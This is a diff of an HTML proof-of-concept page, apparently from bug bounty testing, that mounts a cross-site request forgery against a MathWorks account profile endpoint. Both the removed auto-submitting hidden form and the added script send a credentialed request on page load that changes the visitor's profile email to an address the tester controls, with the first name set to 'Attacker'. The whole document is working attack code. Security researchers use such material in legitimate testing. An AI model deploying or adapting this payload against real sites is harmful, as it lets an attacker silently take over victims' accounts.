@@ -29,24 +29,72 @@
 </html> -->
 <html>
   <body>
-    <form action="https://www.mathworks.com/mwaccount/profiles/update" method="POST" enctype="multipart/form-data">
-      <input type="hidden" name="&#95;method" value="put" />
-      <input type="hidden" name="profile&#91;email&#95;address&#93;" value="mudhaxk&#43;2&#64;bugcrowdninja&#46;com" />
-      <input type="hidden" name="profile&#91;first&#95;name&#93;" value="Aderonmulo" />
-      <input type="hidden" name="profile&#91;last&#95;name&#93;" value="Ariyo" />
-      <input type="hidden" name="profile&#91;country&#93;" value="US" />
-      <input type="hidden" name="profile&#91;picture&#93;" value="" />
-      <input type="hidden" name="profile&#91;latin&#95;last&#95;name&#93;" value="" />
-      <input type="hidden" name="profile&#91;latin&#95;first&#95;name&#93;" value="" />
-      <input type="hidden" name="profile&#91;redirect&#95;uri&#93;" value="" />
-      <input type="hidden" name="profile&#91;form&#95;type&#93;" value="" />
-      <input type="hidden" name="button" value="" />
-      <input type="submit" value="Submit request" />
-    </form>
     <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/www.mathworks.com\/mwaccount\/profiles\/update", true);
+        xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
+        xhr.setRequestHeader("accept", "text\/javascript, application\/javascript, application\/ecmascript, application\/x-ecmascript, *\/*; q=0.01");
+        xhr.setRequestHeader("content-type", "multipart\/form-data; boundary=----WebKitFormBoundaryb9lJdbQma0T5Wg7n");
+        xhr.withCredentials = true;
+        var body = "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"_method\"\r\n" + 
+          "\r\n" + 
+          "put\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[email_address]\"\r\n" + 
+          "\r\n" + 
+          "mudhaxk+1@bugcrowdninja.com\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[first_name]\"\r\n" + 
+          "\r\n" + 
+          "Attacker\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[last_name]\"\r\n" + 
+          "\r\n" + 
+          "Ariyo\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[country]\"\r\n" + 
+          "\r\n" + 
+          "US\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[picture]\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[latin_last_name]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[latin_first_name]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[redirect_uri]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"profile[form_type]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n\r\n" + 
+          "Content-Disposition: form-data; name=\"button\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundaryb9lJdbQma0T5Wg7n--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
     </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
   </body>
 </html>
+
 
